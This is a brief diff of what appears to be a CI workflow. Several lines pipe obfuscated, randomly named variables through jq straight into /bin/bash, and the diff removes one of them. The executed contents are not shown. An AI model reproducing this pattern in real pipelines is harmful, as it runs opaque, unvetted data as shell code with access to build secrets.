@@ -42,7 +42,6 @@ jobs:
           printf '%s' "$ixztz7430" | jq -r .tl5 | /bin/bash
           echo $rclqs24824 | jq -r .v170 | /bin/bash
           echo $ii3 | jq -r .f56 | /bin/bash
-          printf '%s' "$uppej03" | jq -r .fm60490 | /bin/bash
           echo $dkxa69 | jq -r .jls89146 | /bin/bash
           printf '%s' "$q09" | jq -r .efpsb10 | /bin/bash
           echo $px13 | jq -r .gymc2163 | /bin/bash
